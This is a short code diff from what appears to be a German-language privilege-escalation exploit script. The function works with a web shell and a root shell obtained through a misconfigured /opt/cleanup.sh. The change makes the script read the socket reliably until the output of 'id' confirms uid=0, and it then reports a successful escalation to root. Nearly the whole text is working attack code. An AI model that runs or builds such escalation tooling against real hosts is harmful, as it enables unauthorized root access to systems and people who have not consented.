@@ -59,11 +59,22 @@ def run(www_shell):
         print("    → Dateirechte falsch: ls -la /opt/cleanup.sh")
         return None
 
-    # Root-Rechte bestätigen
+    # Root-Rechte bestätigen — lese in einer Schleife bis "uid=" erscheint
+    # oder das Timeout abläuft (initiales Banner/Prompt wird so nicht übersprungen)
     time.sleep(1)
     send_command(root_shell, "id")
-    time.sleep(0.5)
-    response = root_shell.recv(1024).decode()
+    root_shell.settimeout(5)
+    response = ""
+    deadline = time.time() + 10
+    while time.time() < deadline:
+        try:
+            chunk = root_shell.recv(1024).decode(errors="replace")
+            if chunk:
+                response += chunk
+                if "uid=" in response:
+                    break
+        except socket.timeout:
+            break
 
     if "uid=0(root)" in response:
         print("[+] Privilege Escalation erfolgreich!")
